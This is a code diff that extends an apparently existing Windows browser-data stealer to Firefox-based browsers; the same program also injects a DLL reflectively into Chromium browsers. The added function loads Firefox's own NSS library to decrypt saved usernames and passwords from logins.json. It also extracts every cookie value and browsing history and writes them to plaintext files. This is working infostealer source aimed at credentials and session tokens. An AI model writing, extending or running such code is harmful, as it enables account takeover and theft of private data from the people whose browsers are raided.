@@ -258,14 +258,18 @@ struct BrowserConfig {
     bool use_injection;
     std::wstring data_path_relative;
     int csidl_folder;
+    bool is_firefox_based;
 };
 
 const std::vector<BrowserConfig> BROWSERS = {
-    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, true, L"Google\\Chrome\\User Data", CSIDL_LOCAL_APPDATA},
-    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, true, L"Microsoft\\Edge\\User Data", CSIDL_LOCAL_APPDATA},
-    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, L"BraveSoftware\\Brave-Browser\\User Data", CSIDL_LOCAL_APPDATA},
-    {L"Opera", L"launcher.exe", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, L"Opera Software\\Opera Stable", CSIDL_APPDATA},
-    {L"Opera GX", L"launcher.exe", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, L"Opera Software\\Opera GX Stable", CSIDL_APPDATA}
+    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, true, L"Google\\Chrome\\User Data", CSIDL_LOCAL_APPDATA, false},
+    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, true, L"Microsoft\\Edge\\User Data", CSIDL_LOCAL_APPDATA, false},
+    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, L"BraveSoftware\\Brave-Browser\\User Data", CSIDL_LOCAL_APPDATA, false},
+    {L"Opera", L"launcher.exe", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, L"Opera Software\\Opera Stable", CSIDL_APPDATA, false},
+    {L"Opera GX", L"launcher.exe", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, L"Opera Software\\Opera GX Stable", CSIDL_APPDATA, false},
+    {L"Firefox", L"firefox.exe", {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe"}, false, L"Mozilla\\Firefox", CSIDL_APPDATA, true},
+    {L"Waterfox", L"waterfox.exe", {L"C:\\Program Files\\Waterfox\\waterfox.exe"}, false, L"Waterfox", CSIDL_APPDATA, true},
+    {L"LibreWolf", L"librewolf.exe", {L"C:\\Program Files\\LibreWolf\\librewolf.exe"}, false, L"LibreWolf", CSIDL_APPDATA, true}
 };
 
 std::wstring find_browser_exe(const std::wstring& name) {
@@ -383,6 +387,183 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread);
     }
+}
+
+// Firefox NSS function pointers
+typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
+typedef struct { unsigned int len; unsigned char* data; } SECItem;
+typedef SECStatus(*NSSInit_t)(const char*);
+typedef SECStatus(*NSSShutdown_t)(void);
+typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);
+
+void collect_firefox(const BrowserConfig& browser) {
+    std::wcout << L"\n--- Processing Firefox-based Browser: " << browser.name << L" ---" << std::endl;
+    wchar_t sz_path[MAX_PATH];
+    if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
+
+    fs::path data_path = fs::path(sz_path) / browser.data_path_relative;
+    if (!fs::exists(data_path)) return;
+
+    std::vector<fs::path> profile_paths;
+    fs::path ini_path = data_path / "profiles.ini";
+    if (fs::exists(ini_path)) {
+        std::ifstream file(ini_path);
+        std::string line;
+        while (std::getline(file, line)) {
+            if (line.find("Path=") == 0) {
+                std::string p = line.substr(5);
+                bool is_relative = true;
+                // Simplified relative check
+                fs::path profile_path = is_relative ? (data_path / p) : fs::path(p);
+                if (fs::exists(profile_path)) profile_paths.push_back(profile_path);
+            }
+        }
+    }
+
+    if (profile_paths.empty()) {
+        for (const auto& entry : fs::directory_iterator(data_path)) {
+            if (entry.is_directory() && fs::exists(entry.path() / "logins.json")) profile_paths.push_back(entry.path());
+        }
+    }
+
+    std::wstring exe_path = find_browser_exe(browser.name);
+    if (exe_path.empty()) return;
+    fs::path bin_dir = fs::path(exe_path).parent_path();
+
+    // NSS Decryption Setup
+    HMODULE h_nss = NULL;
+    NSSInit_t f_NSS_Init = nullptr;
+    NSSShutdown_t f_NSS_Shutdown = nullptr;
+    PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
+
+    SetDllDirectoryW(bin_dir.c_str());
+    h_nss = LoadLibraryW(L"nss3.dll");
+    if (h_nss) {
+        f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init");
+        f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown");
+        f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt");
+    }
+
+    wchar_t temp_base[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
+    fs::path temp_dir = fs::path(temp_base) / "Temp" / ("firefox_db_" + std::to_string(GetTickCount()));
+    fs::create_directories(temp_dir);
+
+    for (const auto& p_path : profile_paths) {
+        std::string profile_name = p_path.filename().string();
+        std::cout << "[+] Found Profile: " << profile_name << std::endl;
+        ProfileData p_data;
+        p_data.name = profile_name;
+
+        // Decrypt Logins
+        if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
+            if (f_NSS_Init(p_path.string().c_str()) == SECSuccess) {
+                fs::path login_file = p_path / "logins.json";
+                if (fs::exists(login_file)) {
+                    std::ifstream lf(login_file);
+                    json lj = json::parse(lf, nullptr, false);
+                    if (!lj.is_discarded() && lj.contains("logins")) {
+                        for (auto& login : lj["logins"]) {
+                            std::string enc_u = login["encryptedUsername"];
+                            std::string enc_p = login["encryptedPassword"];
+                            std::string url = login["hostname"];
+
+                            auto dec_user_blob = base64_decode(enc_u);
+                            auto dec_pass_blob = base64_decode(enc_p);
+
+                            SECItem in_u = { (unsigned int)dec_user_blob.size(), (unsigned char*)dec_user_blob.data() };
+                            SECItem out_u = { 0, nullptr };
+                            SECItem in_p = { (unsigned int)dec_pass_blob.size(), (unsigned char*)dec_pass_blob.data() };
+                            SECItem out_p = { 0, nullptr };
+
+                            std::string username = enc_u, password = enc_p;
+                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess) {
+                                username = std::string((char*)out_u.data, out_u.len);
+                            }
+                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess) {
+                                password = std::string((char*)out_p.data, out_p.len);
+                            }
+                            p_data.passwords.push_back({ url, username, password });
+                        }
+                    }
+                }
+                f_NSS_Shutdown();
+            }
+        }
+
+        // Cookies
+        fs::path db_path = p_path / "cookies.sqlite";
+        fs::path tmp_db = temp_dir / (profile_name + "_cook.tmp");
+        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        p_data.cookies.push_back({
+                            (const char*)sqlite3_column_text(stmt, 0),
+                            (const char*)sqlite3_column_text(stmt, 1),
+                            (const char*)sqlite3_column_text(stmt, 2),
+                            (const char*)sqlite3_column_text(stmt, 3),
+                            sqlite3_column_int64(stmt, 4) * 1000000,
+                            sqlite3_column_int(stmt, 5),
+                            sqlite3_column_int(stmt, 6),
+                            0
+                        });
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+            cleanup_db_temp(tmp_db);
+        }
+
+        // History
+        db_path = p_path / "places.sqlite";
+        tmp_db = temp_dir / (profile_name + "_hist.tmp");
+        if (fs::exists(db_path) && copy_db_with_sidecars(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_for_extraction(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM moz_places LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+            cleanup_db_temp(tmp_db);
+        }
+
+        // Save Firefox reports
+        fs::path browser_dir(browser.name);
+        fs::create_directories(browser_dir);
+        std::string p_name_sanit = profile_name;
+        std::replace(p_name_sanit.begin(), p_name_sanit.end(), '/', '_');
+        std::replace(p_name_sanit.begin(), p_name_sanit.end(), '\\', '_');
+        std::replace(p_name_sanit.begin(), p_name_sanit.end(), ':', '_');
+        fs::path profile_dir = browser_dir / p_name_sanit;
+        fs::create_directories(profile_dir);
+
+        try {
+            std::ofstream pass_file(profile_dir / "passwords.txt");
+            for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
+            std::ofstream(profile_dir / "passwords.json") << json(p_data.passwords).dump(4);
+
+            std::ofstream cookie_file(profile_dir / "cookies.txt");
+            for (auto& c : p_data.cookies) cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+
+            std::ofstream hist_file(profile_dir / "history.txt");
+            for (auto& h : p_data.history) hist_file << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n";
+        } catch (...) {}
+    }
+
+    if (h_nss) FreeLibrary(h_nss);
+    SetDllDirectoryW(NULL);
+    fs::remove_all(temp_dir);
 }
 
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
@@ -745,7 +926,11 @@ int main(int argc, char* argv[]) {
         choice_lower.erase(std::remove(choice_lower.begin(), choice_lower.end(), ' '), choice_lower.end());
 
         if (choice_lower == "all" || choice_lower == name_lower) {
-            inject_and_collect(dll_bytes, config);
+            if (config.is_firefox_based) {
+                collect_firefox(config);
+            } else {
+                inject_and_collect(dll_bytes, config);
+            }
         }
     }
 
